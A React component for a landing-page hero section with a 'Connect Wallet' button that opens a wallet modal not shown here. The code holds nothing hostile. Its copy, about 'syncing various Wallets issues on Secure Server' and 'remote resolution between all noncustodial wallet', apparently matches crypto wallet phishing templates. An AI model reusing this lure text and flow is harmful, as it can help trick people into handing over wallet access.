"use client";

import React from "react";
import Button from "./Button";
import WalletModal from "./WalletModal";
import { useAppStore } from "../store/useAppStore";

const HeroSection: React.FC = () => {
  const {
    showWalletModal,
    setShowWalletModal,
    isWalletConnected,
    selectedWallet,
  } = useAppStore();

  const handleConnectWallet = () => {
    setShowWalletModal(true);
  };

  const handleSelectChain = () => {
    // TODO: Implement chain selection modal
    console.log("Select chain clicked");
  };

  return (
    <div className="min-h-screen relative overflow-hidden isolate">
      <div className="relative z-10 font-heading flex flex-col items-center justify-center min-h-screen px-4 text-center">
        {/* Protocol Badge */}
        <div className="bg-purple-600/20 backdrop-blur-sm border border-purple-500/30 rounded-full px-4 py-2 mb-8">
          <span className="text-white text-sm font-medium">
            Decentralized Protocol
          </span>
        </div>

        {/* Main Title */}
        <h1 className="text-4xl md:text-6xl font-bold text-white mb-6 max-w-4xl leading-tight">
          Decentralized protocol for syncing various Wallets issues on Secure
          Server.
        </h1>

        {/* Description */}
        <p className="text-lg md:text-xl text-gray-300 mb-12 max-w-2xl">
          This is not an app but a protocol that establishes a remote resolution
          between all noncustodial wallet.
        </p>

        {/* Action Buttons */}
        <div className="flex flex-col sm:flex-row gap-4 mb-16">
          <Button onClick={handleConnectWallet}>
            {isWalletConnected
              ? `Connected: ${selectedWallet?.name}`
              : "Connect Wallet"}
          </Button>

          {/* <Button onClick={handleSelectChain}>Select Chain</Button> */}
        </div>
      </div>

      {/* Wallet Modal */}
      <WalletModal
        isOpen={showWalletModal}
        onClose={() => setShowWalletModal(false)}
      />
    </div>
  );
};

export default HeroSection;
